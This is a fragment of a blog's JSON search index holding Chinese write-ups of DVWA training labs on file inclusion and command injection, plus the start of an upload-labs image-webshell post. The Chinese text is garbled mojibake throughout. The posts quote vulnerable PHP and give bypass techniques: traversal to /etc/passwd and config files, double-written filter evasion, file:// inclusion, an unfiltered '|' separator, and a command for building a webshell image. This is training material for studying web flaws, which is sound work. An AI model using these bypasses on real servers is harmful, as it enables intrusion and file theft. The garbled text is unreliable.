$___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWAâ€”File Inclusion","date":"2021-02-28T11:26:47.000Z","path":"2021/02/28/DVWAâ€”File Inclusion/","text":"å‰è¨€ï¼šFile Inclusionï¼Œè¯‘ä¸ºæ–‡ä»¶åŒ…å«ï¼ˆæ¼æ´ï¼‰ã€‚æœåŠ¡å™¨å¼€å¯allow_url_includeé€‰é¡¹æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡phpçš„æŸäº›ç‰¹æ€§å‡½æ•°ï¼ˆinclude()ï¼Œrequire()å’Œinclude_once()ï¼Œrequire_once()ï¼‰åˆ©ç”¨urlå»åŠ¨æ€åŒ…å«æ–‡ä»¶ã€‚æ­¤æ—¶å¦‚æœæ²¡æœ‰å¯¹æ–‡ä»¶æ¥æºè¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šé€šè¿‡æµè§ˆå™¨åŒ…å«webæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´æ˜¯å› ä¸ºæœåŠ¡å™¨åŒ…å«æ–‡ä»¶æ—¶æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œç›´æ¥å…è®¸å¹¶æ‰§è¡Œç”¨æˆ·åœ¨urlè¾“å…¥çš„æœåŠ¡å™¨åŒ…å«æ–‡ä»¶ã€‚é€šä¿—çš„è¯´å°±æ˜¯è¢«åŒ…å«çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨æœ¬åœ°ã€‚ è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼šæœåŠ¡å™¨å¼€å¯äº†phpé…ç½®ä¸­çš„allow_url_fopené€‰é¡¹ï¼ˆé€‰é¡¹å¼€å¯ä¹‹åï¼ŒæœåŠ¡å™¨å…è®¸åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶ï¼‰ã€‚åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šé¢„å…ˆè®¾ç½®å¥½çš„webshellï¼Œç„¶åæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶ã€‚è¿™ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸ºæœåŠ¡å™¨å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œä¼šå¯¼è‡´ä¸åŒç¨‹åº¦çš„ä¿¡æ¯æ³„éœ²ã€‚é€šä¿—çš„è¯´å°±æ˜¯è¢«åŒ…å«çš„æ–‡ä»¶ä¸åœ¨ç›®æ ‡æœåŠ¡å™¨ã€‚ å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è·å–ç³»ç»Ÿï¼ˆæœåŠ¡å™¨ï¼‰çš„æœ¬åœ°æ–‡ä»¶çš„å†…å®¹ã€‚Windowsç³»ç»Ÿå¸¸è§æ•æ„Ÿæ–‡ä»¶å¦‚ä¸‹ï¼š c:\\boot.ini ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯c:\\xxx\\php.ini PHPé…ç½®ä¿¡æ¯ã€‚c:\\xxx\\my.ini MySQLé…ç½®ä¿¡æ¯ã€‚c: \\xxx\\httpd.conf Apacheé…ç½®ä¿¡æ¯ã€‚linuxç³»ç»Ÿå¸¸è§æ•æ„Ÿæ–‡ä»¶å¦‚ä¸‹ï¼š /etc/passwd Linuxç³»ç»Ÿè´¦å·ä¿¡æ¯ã€‚/etc/httpd/conf/httpd.conf Apacheé…ç½®ä¿¡æ¯ã€‚/etc/my.conf MySQLé…ç½®ä¿¡æ¯ã€‚/usr/etc/php.ini PHPé…ç½®ä¿¡æ¯ã€‚ å¸¸è§è·¯å¾„ç¬¦å· / æ ¹ç›®å½•./ å½“å‰ç›®å½•../ è¿”å›åˆ°ä¸Šä¸€çº§ç›®å½•../../ è¿”å›ä¸Šä¸¤çº§ç›®å½•.\\ ã€..\\å’Œ./ã€../ æ„ä¹‰ç›¸åŒ Lowï¼šæŸ¥çœ‹æºç ï¼š 123456&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç«¯å¯¹pageå‚æ•°æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤è·Ÿæ£€æŸ¥ã€‚ åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ æˆ‘ä»¬å…ˆè®©å‚æ•°pageçš„å€¼ç­‰äºä¸€ä¸ªæœåŠ¡å™¨æœ¬åœ°ä¸å­˜åœ¨çš„æ–‡ä»¶![1](DVWAâ€”File Inclusion/1.png) æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸º\\DVWA-master\\ï¼Œè€Œindex.phpæ–‡ä»¶è·æ ¹ç›®å½•å·®ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ä¸ª../å›åˆ°æ ¹ç›®å½•ï¼Œç„¶åå»è®¿é—®ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼šå¦‚PHPç‰ˆæœ¬ä¿¡æ¯ç­‰ã€‚![2](DVWAâ€”File Inclusion/2.png) åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ å› ä¸ºæˆ‘ä»¬æ­çš„æ˜¯é¶åœºæ¨¡æ‹ŸæœåŠ¡å™¨ï¼Œé‚£dvwaï¼ˆ81ç«¯å£ï¼‰é¶åœºå°±ç›¸å½“äºä¸€ä¸ªæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å†åœ¨â€œè¿œç«¯æœåŠ¡å™¨â€127.0.0.1ä¸‹ä¸Šä¼ æ–‡ä»¶1.txtå†…å®¹ä¸ºï¼š 123&lt;?php phpinfo();?&gt; ç„¶ååˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«è®¿é—®![3](DVWAâ€”File Inclusion/3.png) Mediumï¼šæŸ¥çœ‹æºç ï¼š 12345678910&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¿‡æ»¤äº†http://, https://ï¼Œ../, ..\\ï¼Œä½†æ˜¯æˆ‘ä»¬åªè¦ç”¨åŒå†™å°±å¯ä»¥ç»•è¿‡äº† ![4](DVWAâ€”File Inclusion/4.png) ![5](DVWAâ€”File Inclusion/5.png) Highï¼šæŸ¥çœ‹æºç ï¼š 12345678910111213&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; æ–°å‡½æ•°ï¼š fnmatch() å‡½æ•° åŠŸèƒ½ï¼šæ ¹æ®æŒ‡å®šçš„æ¨¡å¼æ¥åŒ¹é…æ–‡ä»¶åæˆ–å­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šfnmatch(pattern,string,flags) å‚æ•° æè¿° pattern å¿…éœ€ã€‚è§„å®šè¦æ£€ç´¢çš„æ¨¡å¼ã€‚ string å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ã€‚ flags å¯é€‰ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è§„å®šåªèƒ½åŒ…å«ä»¥fileå¼€å¤´çš„æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨fileåè®®ç»•è¿‡ã€‚ fileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬ç”¨æµè§ˆå™¨æ‰“å¼€ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶æ—¶åˆ©ç”¨çš„å°±æ˜¯fileåè®®![6](DVWAâ€”File Inclusion/6.png) fileåè®®çš„åŸºæœ¬æ ¼å¼ï¼šfile:///æ–‡ä»¶è·¯å¾„ ç”±äºfileåè®®è§„å®šåªèƒ½ç”±äºè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼Œå› æ­¤æ­é…æ–‡ä»¶ä¸Šä¼ æ¼æ´æ•ˆæœæä½³ã€‚![7](DVWAâ€”File Inclusion/7.png) Impossibleï¼šæŸ¥çœ‹æºç ï¼š 1234567891011121314Impossible File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWAâ€”â€”Command Injection","date":"2021-02-25T12:24:15.000Z","path":"2021/02/25/DVWAâ€”Command Injection/","text":"å‰è¨€ï¼šå‘½ä»¤æ³¨å…¥â€”â€”åˆ©ç”¨å¯ä»¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„webåº”ç”¨ï¼Œé€šè¿‡æ„é€ ç‰¹æ®Šå‘½ä»¤å­—ç¬¦ä¸²çš„æ–¹å¼ï¼ŒæŠŠæ¶æ„ä»£ç è¾“å…¥ä¸€ä¸ªç¼–è¾‘åŸŸ(ä¾‹å¦‚ç¼ºä¹æœ‰æ•ˆéªŒè¯çš„è¾“å…¥æ¡†)æ¥æ”¹å˜ç½‘é¡µåŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œæœ€ç»ˆå®ç°æœ¬åº”åœ¨æœåŠ¡ç«¯æ‰èƒ½å·¥ä½œçš„ç³»ç»Ÿå‘½ä»¤ã€‚å‘½ä»¤æ³¨å…¥æ”»å‡»çš„å¸¸è§åœºæ™¯ä¸ºï¼šä»…ä»…éœ€è¦è¾“å…¥æ•°æ®çš„åœºåˆï¼Œæ”»å‡»è€…æ„é€ æ•°æ®åŒæ—¶è¾“å…¥äº†æ¶æ„å‘½ä»¤ä»£ç ï¼Œè€Œç³»ç»Ÿå¯¹æ­¤å¹¶æœªè¿‡æ»¤ï¼Œæ¶æ„å‘½ä»¤ä»£ç ä¸€å¹¶æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´ä¿¡æ¯æ³„éœ²æˆ–è€…æ­£å¸¸æ•°æ®çš„ç ´åï¼›PHPå‘½ä»¤æ³¨å…¥æ”»å‡»æ¼æ´æ˜¯PHPåº”ç”¨ç¨‹åºä¸­å¸¸è§çš„è„šæœ¬æ¼æ´ä¹‹ä¸€ã€‚å‘½ä»¤æ³¨å…¥å’Œä»£ç æ³¨å…¥ä¸åŒï¼Œä»£ç æ³¨å…¥çš„ç›®çš„åœ¨äºå°†å¤–éƒ¨ä»£ç æ³¨å…¥åº”ç”¨ç¨‹åºæœ¬èº«ï¼Œå¹¶éšç¨‹åºæ‰§è¡Œï¼›å‘½ä»¤æ”»å‡»çš„å¯¹è±¡æ˜¯æœåŠ¡å™¨çš„å®¿ä¸»æœºã€‚å› æ­¤ç”¨æˆ·å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¾“å…¥æ¥è¾¾åˆ°å…¥ä¾µç›®çš„ã€‚ &amp;ï¼Œ&amp;&amp;ï¼Œ|ï¼Œ||å‘½ä»¤æ‹¼æ¥ç¬¦çš„åŒºåˆ«: A&amp;B æ‹¼æ¥ï¼ŒAå’ŒBä¹‹é—´æ— åˆ¶çº¦å…³ç³» A&amp;&amp;B Aæ‰§è¡ŒæˆåŠŸï¼Œä¹‹åæ‰ä¼šæ‰§è¡ŒB A|B Açš„è¾“å‡ºä½œä¸ºBçš„è¾“å…¥ A||B Aæ‰§è¡Œå¤±è´¥ï¼Œä¹‹åæ‰ä¼šæ‰§è¡ŒB A;B ; åˆ†å·è¡¨ç¤ºå‘½ä»¤ä¾æ¬¡æ‰§è¡Œã€‚ windowsç³»ç»Ÿä¸‹å¸¸è§çš„æ‹¼æ¥å‘½ä»¤ï¼š ipconfig æŸ¥çœ‹æœ¬åœ°ç½‘ç»œ net user æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ· dir æŸ¥çœ‹å½“å‰ç›®å½• find æŸ¥æ‰¾åŒ…å«æŒ‡å®šå­—ç¬¦çš„è¡Œ whoami æŸ¥çœ‹ç³»ç»Ÿå½“å‰æœ‰æ•ˆç”¨æˆ·å Linuxå‘½ä»¤å¤§å…¨ï¼šhttps://www.runoob.com/linux/linux-command-manual.html Low:æŸ¥çœ‹æºç ï¼š 1234567891011121314151617&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; æ–°å‡½æ•°ï¼š php_uname()å‡½æ•° åŠŸèƒ½ï¼šè¿”å›è¿è¡Œ PHP çš„ç³»ç»Ÿçš„æœ‰å…³ä¿¡æ¯ã€‚ è¯­æ³•ï¼šphp_uname ([ string $mode = â€œaâ€ ] ) å…¶ä¸­ï¼Œmode æ˜¯å•ä¸ªå­—ç¬¦ï¼Œç”¨äºå®šä¹‰è¦è¿”å›ä»€ä¹ˆä¿¡æ¯ï¼š &#39;a&#39;ï¼šæ­¤ä¸ºé»˜è®¤ã€‚åŒ…å«åºåˆ— &quot;s n r v m&quot; é‡Œçš„æ‰€æœ‰æ¨¡å¼ã€‚ &#39;s&#39;ï¼šæ“ä½œç³»ç»Ÿåç§°ã€‚ä¾‹å¦‚ï¼š FreeBSDã€‚ &#39;n&#39;ï¼šä¸»æœºåã€‚ä¾‹å¦‚ï¼š localhost.example.comã€‚ &#39;r&#39;ï¼šç‰ˆæœ¬åç§°ï¼Œä¾‹å¦‚ï¼š 5.1.2-RELEASEã€‚ &#39;v&#39;ï¼šç‰ˆæœ¬ä¿¡æ¯ã€‚æ“ä½œç³»ç»Ÿä¹‹é—´æœ‰å¾ˆå¤§çš„ä¸åŒã€‚ &#39;m&#39;ï¼šæœºå™¨ç±»å‹ã€‚ä¾‹å¦‚ï¼ši386ã€‚ shell_exec()å‡½æ•° åŠŸèƒ½ï¼šé€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚ï¼ˆè¡¥å……ï¼šShell æ˜¯æŒ‡ä¸€ç§åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªç•Œé¢è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸çš„æœåŠ¡ã€‚ï¼‰ è¯­æ³•ï¼šshell_exec ( string $cmd ) å…¶ä¸­å‚æ•°cmdä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ æŸ¥çœ‹æºç æˆ‘ä»¬å¯çŸ¥ï¼ŒæœåŠ¡å™¨é€šè¿‡stristrå’Œphp_unameä¸¤ä¸ªå‡½æ•°æ¥åˆ¤æ–­æ“ä½œç³»ç»Ÿï¼Œæ‰§è¡Œä¸åŒçš„pingå‘½ä»¤ã€‚åŒæ—¶æœåŠ¡å™¨æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„IPåœ°å€åšä»»ä½•çš„è¿‡æ»¤å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»æ„çš„å‘½ä»¤æ‰§è¡Œåˆ†éš”ç¬¦æ¥æ‰§è¡Œæˆ‘ä»¬çš„æŒ‡ä»¤ã€è·å–æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚ ä¾‹å¦‚è¾“å…¥ï¼š127.0.0.1&amp;&amp;echo â€œhello worldâ€ ![1](DVWAâ€”Command Injection/1.png) Medium:æŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; æ–°å‡½æ•°ï¼š str_replace()å‡½æ•° åŠŸèƒ½ï¼šæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚ è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚ å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚ å¦‚æœåŒæ—¶éœ€è¦å¯¹æŸä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™çš„å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚ å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ã€‚ è¡¥å……ï¼šè¯¥å‡½æ•°æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚ str_ireplace() å‡½æ•°æ‰§è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æœç´¢ã€‚ è¯­æ³•ï¼šstr_ireplace(find,replace,string,count) å‚æ•° æè¿° find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚ replace å¿…éœ€ã€‚è§„å®šæ›¿æ¢ find ä¸­çš„å€¼çš„å€¼ã€‚ string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ count å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚ array_keys() å‡½æ•° åŠŸèƒ½ï¼šè¿”å›åŒ…å«æ•°ç»„ä¸­æ‰€æœ‰é”®åçš„ä¸€ä¸ªæ–°æ•°ç»„ã€‚ è¯­æ³•ï¼šarray_keys(array,value,strict) å‚æ•° æè¿° array å¿…éœ€ã€‚è§„å®šæ•°ç»„ã€‚ value å¯é€‰ã€‚æ‚¨å¯ä»¥æŒ‡å®šé”®å€¼ï¼Œç„¶ååªæœ‰è¯¥é”®å€¼å¯¹åº”çš„é”®åä¼šè¢«è¿”å›ã€‚ strict å¯é€‰ã€‚ä¸ value å‚æ•°ä¸€èµ·ä½¿ç”¨ã€‚ å¯èƒ½çš„å€¼ï¼štrue - è¿”å›å¸¦æœ‰æŒ‡å®šé”®å€¼çš„é”®åã€‚ä¾èµ–ç±»å‹ï¼Œæ•°å­— 5 ä¸å­—ç¬¦ä¸² â€œ5â€ æ˜¯ä¸åŒçš„ï¼› false - é»˜è®¤å€¼ã€‚ä¸ä¾èµ–ç±»å‹ï¼Œæ•°å­— 5 ä¸å­—ç¬¦ä¸² â€œ5â€ æ˜¯ç›¸åŒçš„ã€‚ â€‹ èœé¸Ÿå®ä¾‹ï¼š 12345&lt;?php$a&#x3D;array(&quot;Volvo&quot;&#x3D;&gt;&quot;XC90&quot;,&quot;BMW&quot;&#x3D;&gt;&quot;X5&quot;,&quot;Toyota&quot;&#x3D;&gt;&quot;Highlander&quot;);print_r(array_keys($a));?&gt;è¿è¡Œç»“æœï¼šArray ( [0] &#x3D;&gt; Volvoï¼Œ[1] &#x3D;&gt; BMW ï¼Œ[2] &#x3D;&gt; Toyota ) é€šè¿‡æŸ¥çœ‹æºç æˆ‘ä»¬å‘ç°æœåŠ¡å™¨è®¾ç½®äº†é»‘åå•è¿‡æ»¤äº†å­—ç¬¦&amp;&amp;å’Œ;ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ˜¯ç”¨&amp;æ›¿ä»£ï¼Œ&amp;;&amp;ç»•è¿‡çš„æ–¹å¼é¿å¼€é»‘åå•ã€‚ Highï¼šæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; é€šè¿‡æŸ¥çœ‹æºç æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨å¯¹é»‘åå•è¿›è¡Œäº†è¡¥å……ï¼Œä½†æ˜¯å‘ç°é»‘åå•ç¦ç”¨çš„æ˜¯&#39;| &#39;(è¿™ä¸ªé‡Œé¢æœ‰ä¸ªç©ºæ ¼)ï¼Œè€Œä¸æ˜¯&#39;|&#39;ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´|å‘½ä»¤æŒ‡ä»¤ç¬¦æœªè¢«ç¦ç”¨ã€‚ Impossibleï¼šæŸ¥çœ‹æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"upload-labs-pass14-21","date":"2021-02-20T04:27:30.000Z","path":"2021/02/20/upload-labs-pass14-21/","text":"[TOC] å‰è¨€ä»pass-14å¼€å§‹éƒ½æ˜¯å›¾ç‰‡é©¬æ­é…æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ å›¾ç‰‡é©¬çš„åˆ¶ä½œ ä½¿ç”¨cmdåˆ¶ä½œå›¾ç‰‡é©¬ï¼šcopy 1.jpg/b+1.php 2.jpgâ€”â€”æ„æ€æ˜¯å°†1.jpgä»¥äºŒè¿›åˆ¶æ–¹å¼ä¸1.phpåˆå¹¶æˆ2.jpgï¼Œè¿™ä¸ª2.jpgå°±æ˜¯å›¾ç‰‡é©¬äº†ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´ -ã€‹æ–‡ä»¶åŒ…å«ç®€ä»‹ï¼šæœåŠ¡å™¨æ‰§è¡ŒPHPæ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½å¦ä¸€ä¸ªæ–‡ä»¶ä¸­çš„PHPä»£ç ï¼Œå¹¶ä¸”å½“ä½œPHPæ¥æ‰§è¡Œã€‚ -ã€‹æ–‡ä»¶åŒ…å«å‡½æ•°ï¼šPHPä¸­æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§ï¼š 1.require()ï¼›2.require_once()ï¼›3.include()ï¼›4.include_once() includeå’ŒrequireåŒºåˆ«ä¸»è¦æ˜¯ï¼Œincludeåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œrequireå‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚ è€Œinclude_once()ï¼Œrequire_once()è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚ 